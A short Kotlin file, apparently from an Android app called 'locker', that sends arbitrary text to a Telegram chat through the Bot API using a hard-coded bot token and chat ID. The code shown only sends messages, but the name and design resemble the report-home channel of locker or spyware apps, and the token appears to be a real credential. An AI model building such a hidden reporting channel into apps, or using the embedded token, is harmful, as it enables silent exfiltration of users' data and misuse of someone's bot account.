package com.contoh.locker
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

object TelegramSender {
    // GANTI DUA BARIS INI
    private const val BOT_TOKEN = "8978224174:AAGS7qCDEbSAVexN2tKV3gR1x-QFU9MEEvI"
    private const val CHAT_ID   = "7027935587"

    fun send(text: String) {
        val client = OkHttpClient()
        val body = FormBody.Builder()
            .add("chat_id", CHAT_ID)
            .add("text", text)
            .build()
        val req = Request.Builder()
            .url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
            .post(body).build()
        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(c: Call, e: IOException) {}
            override fun onResponse(c: Call, r: Response) { r.close() }
        })
    }
}